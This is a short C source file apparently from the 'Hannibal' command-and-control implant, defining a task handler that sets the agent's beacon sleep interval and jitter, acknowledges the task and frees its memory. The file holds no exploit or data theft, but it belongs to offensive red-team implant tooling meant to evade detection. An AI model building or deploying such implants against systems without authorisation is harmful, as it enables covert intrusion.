#include "config.h"


#ifdef INCLUDE_CMD_SLEEP

#include "hannibal_tasking.h"


SECTION_CODE void cmd_sleep(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_SLEEP *sleep = (CMD_SLEEP *)t.cmd;
    UINT32 interval = sleep->interval;
    UINT32 jitter = sleep->jitter;

    hannibal_instance_ptr->config.sleep = interval;
    hannibal_instance_ptr->config.jitter = jitter;

    hannibal_response(L"Set", t.task_uuid);

    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
    
}

#endif